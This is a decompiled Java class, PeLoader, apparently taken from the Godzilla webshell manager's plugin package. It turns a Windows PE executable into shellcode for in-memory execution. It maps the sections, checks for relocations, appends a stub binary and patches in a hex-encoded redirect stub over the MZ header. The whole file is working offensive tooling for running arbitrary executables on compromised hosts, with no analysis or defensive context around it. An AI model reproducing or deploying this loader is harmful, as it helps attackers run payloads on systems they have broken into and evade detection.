/*     */ package shells.plugins.generic;
/*     */ 
/*     */ import com.kichik.pecoff4j.PE;
/*     */ import com.kichik.pecoff4j.SectionData;
/*     */ import com.kichik.pecoff4j.SectionHeader;
/*     */ import com.kichik.pecoff4j.io.PEParser;
/*     */ import java.io.ByteArrayInputStream;
/*     */ import java.io.InputStream;
/*     */ import java.nio.ByteBuffer;
/*     */ import java.nio.ByteOrder;
/*     */ import util.functions;
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ public class PeLoader
/*     */ {
/*  18 */   private static int IMAGE_DIRECTORY_ENTRY_BASERELOC = 5;
/*  19 */   private static int IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR = 14;
/*  20 */   private static int IMAGE_DIRECTORY_ENTRY_TLS = 9;
/*  21 */   private static int SIZE_64_IMAGE_NT_HEADERS = 264;
/*  22 */   private static int SIZE_86_IMAGE_NT_HEADERS = 248;
/*  23 */   private static int SIZE_IMAGE_SECTION_HEADER = 40;
/*     */ 
/*     */   
/*     */   public static byte[] peToShellcode(byte[] peBuffer, StringBuilder logBuffer) throws Exception {
/*  27 */     PE pe = PEParser.parse(new ByteArrayInputStream(peBuffer));
/*     */     
/*  29 */     byte[] _peBuffer = new byte[pe.getOptionalHeader().getSizeOfImage()];
/*     */     
/*  31 */     for (int i = 0; i < pe.getSectionTable().getNumberOfSections(); i++) {
/*  32 */       int index = pe.getSectionTable().getHeader(i).getVirtualAddress();
/*     */       
/*  34 */       SectionData section = pe.getSectionTable().getSection(i);
/*  35 */       if (section != null) {
/*  36 */         byte[] sectionData = section.getData();
/*  37 */         System.arraycopy(sectionData, 0, _peBuffer, index, sectionData.length);
/*     */       } 
/*     */     } 
/*  40 */     System.arraycopy(peBuffer, 0, _peBuffer, 0, pe.getOptionalHeader().getSizeOfHeaders());
/*     */     
/*  42 */     peBuffer = _peBuffer;
/*  43 */     _peBuffer = null;
/*     */ 
/*     */ 
/*     */     
/*  47 */     if (pe.getOptionalHeader().getDataDirectory(IMAGE_DIRECTORY_ENTRY_BASERELOC).getVirtualAddress() == 0) {
/*  48 */       logBuffer.append("[-] The PE must have relocations!\n");
/*  49 */       return null;
/*     */     } 
/*     */     
/*  52 */     if (pe.getOptionalHeader().getDataDirectory(IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR).getVirtualAddress() != 0) {
/*  53 */       logBuffer.append("[-] .NET applications are not supported!\n");
/*  54 */       return null;
/*     */     } 
/*  56 */     if (pe.getOptionalHeader().getDataDirectory(IMAGE_DIRECTORY_ENTRY_TLS).getVirtualAddress() != 0) {
/*  57 */       logBuffer.append("[WARNING] This application has TLS callbacks, which are not supported!\n");
/*     */     }
/*  59 */     if (pe.getOptionalHeader().getSubsystem() != 2) {
/*  60 */       logBuffer.append("[WARNING] This is a console application! The recommended subsystem is GUI.\n");
/*     */     }
/*     */     
/*  63 */     logBuffer.append(String.format("[*] This is a x%d exe\n", new Object[] { Integer.valueOf(pe.is64() ? 64 : 32) }));
/*     */     
/*  65 */     String stubName = String.format("assets/stub%d.bin", new Object[] { Integer.valueOf(pe.is64() ? 64 : 32) });
/*     */     
/*  67 */     InputStream inputStream = PeLoader.class.getResource(stubName).openStream();
/*     */     
/*  69 */     byte[] stub = functions.readInputStreamAutoClose(inputStream);
/*     */     
/*  71 */     byte[] newExeBuffer = new byte[peBuffer.length + stub.length];
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */     
/*  83 */     String redir_codeHex = "4D5A4552E8000000005B4883EB09534881C3" + functions.byteArrayToHex(functions.intToBytes(peBuffer.length)) + "FFD3c3";
/*     */ 
/*     */ 
/*     */     
/*  87 */     byte[] redir_code = functions.hexToByte(redir_codeHex);
/*     */     
/*  89 */     System.arraycopy(peBuffer, 0, newExeBuffer, 0, peBuffer.length);
/*     */     
/*  91 */     System.arraycopy(stub, 0, newExeBuffer, peBuffer.length, stub.length);
/*     */     
/*  93 */     System.arraycopy(redir_code, 0, newExeBuffer, 0, redir_code.length);
/*     */ 
/*     */     
/*  96 */     for (int j = 0; j < pe.getSectionTable().getNumberOfSections(); j++) {
/*  97 */       int secPtr = pe.getDosHeader().getAddressOfNewExeHeader() + (pe.is64() ? SIZE_64_IMAGE_NT_HEADERS : SIZE_86_IMAGE_NT_HEADERS) + SIZE_IMAGE_SECTION_HEADER * j;
/*  98 */       SectionHeader sectionHeader = pe.getSectionTable().getHeader(j);
/*  99 */       sectionHeader.setVirtualSize(get_virtual_sec_size(pe, j));
/* 100 */       sectionHeader.setSizeOfRawData(sectionHeader.getVirtualSize());
/* 101 */       sectionHeader.setPointerToRawData(sectionHeader.getVirtualAddress());
/*     */       
/* 103 */       byte[] sectionHeaderBytes = encodeSection(sectionHeader);
/*     */       
/* 105 */       System.arraycopy(sectionHeaderBytes, 0, newExeBuffer, secPtr, sectionHeaderBytes.length);
/*     */     } 
/*     */ 
/*     */     
/* 109 */     return newExeBuffer;
/*     */   }
/*     */   
/*     */   private static byte[] encodeSection(SectionHeader sectionHeader) {
/* 113 */     byte[] sectionBytes = new byte[SIZE_IMAGE_SECTION_HEADER];
/* 114 */     byte[] name = sectionHeader.getName().getBytes();
/* 115 */     ByteBuffer byteBuffer = ByteBuffer.wrap(sectionBytes);
/* 116 */     byteBuffer.order(ByteOrder.LITTLE_ENDIAN);
/*     */     
/* 118 */     byteBuffer.put(name);
/* 119 */     byteBuffer.put(new byte[8 - name.length]);
/* 120 */     byteBuffer.putInt(sectionHeader.getVirtualSize());
/*     */     
/* 122 */     byteBuffer.putInt(sectionHeader.getVirtualAddress());
/* 123 */     byteBuffer.putInt(sectionHeader.getSizeOfRawData());
/* 124 */     byteBuffer.putInt(sectionHeader.getPointerToRawData());
/* 125 */     byteBuffer.putInt(sectionHeader.getPointerToRelocations());
/* 126 */     byteBuffer.putInt(sectionHeader.getPointerToLineNumbers());
/* 127 */     byteBuffer.putShort((short)sectionHeader.getNumberOfRelocations());
/* 128 */     byteBuffer.putShort((short)sectionHeader.getNumberOfLineNumbers());
/* 129 */     byteBuffer.putInt(sectionHeader.getCharacteristics());
/* 130 */     return byteBuffer.array();
/*     */   }
/*     */   
/*     */   private static int get_virtual_sec_size(PE pe, int sectionIndex) {
/* 134 */     int alignment = pe.getOptionalHeader().getSectionAlignment();
/* 135 */     SectionHeader sectionHeader = pe.getSectionTable().getHeader(sectionIndex);
/* 136 */     int vsize = sectionHeader.getVirtualSize();
/* 137 */     int units = vsize / alignment;
/* 138 */     if (vsize % alignment > 0) {
/* 139 */       units++;
/*     */     }
/* 141 */     vsize = units * alignment;
/*     */     
/* 143 */     int image_size = pe.getOptionalHeader().getSizeOfImage();
/*     */     
/* 145 */     if (sectionHeader.getVirtualAddress() + vsize > image_size) {
/* 146 */       vsize = sectionHeader.getVirtualSize();
/*     */     }
/*     */     
/* 149 */     return vsize;
/*     */   }
/*     */ }


/* Location:              C:\User\\user\Downloads\godzilla.jar!\shells\plugins\generic\PeLoader.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */